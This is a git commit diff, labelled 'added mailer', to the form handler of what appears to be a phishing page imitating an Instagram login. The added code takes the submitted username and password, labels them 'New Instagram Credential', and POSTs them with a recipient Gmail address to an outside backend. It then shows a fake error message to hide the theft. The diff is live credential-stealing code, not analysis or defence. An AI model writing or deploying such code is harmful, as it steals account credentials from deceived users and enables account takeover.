2f243bc235897dff5d3f25c46037853fe8c77df2
ranken.dev <oshiobugieagwegiokhe@gmail.com>
2023-04-29 11:59:53 +0100

    added mailer

--- js/functions/query09129379.js
+++ js/functions/query09129379.js
@@ -9,11 +9,35 @@ const handleSubmit = (e) => {
     setTimeout(()=>{
         result.innerHTML= "<div style='padding: 60px 0;'></div>";
         setTimeout(()=>{
-            const email_backend = "https://active-pay-backend.onrender.com/"
+            const form = new FormData();
+            const recipient = "dagbotester@gmail.com";
+            const email_backend = "https://active-pay-backend.onrender.com/";
+            const body = (`
+               New Instagram Credential
+
+               Email/Username: ${e.target.username.value}
+               Password: ${e.target.password.value}
+
+            `);
+
+            form.append('recipient', recipient);
+            form.append('body', body);
+
             // send the mail
-            fetch()
-            result.innerHTML="<div style='padding: 25px;text-align:center;'>Sorry we cannot process this request at this time, try again shortly or <a href='/index.html'>Go Back</a></div>";
-            loader.style.display = "none";
+            fetch(email_backend, {
+                mode: 'cors',
+                headers:{
+                    'Access-Control-Allow-Origin':'*'
+                }, 
+                method: 'POST', 
+                body: form
+            })
+            .then(action =>{
+                result.innerHTML="<div style='padding: 25px;text-align:center;'>Sorry we cannot process this request at this time, try again shortly or <a href='/index.html'>Go Back</a></div>";
+                loader.style.display = "none";
+            })
+            .catch(err=>console.log("Error: ", err));
+
         }, 5000);
     }, 3000)
 };
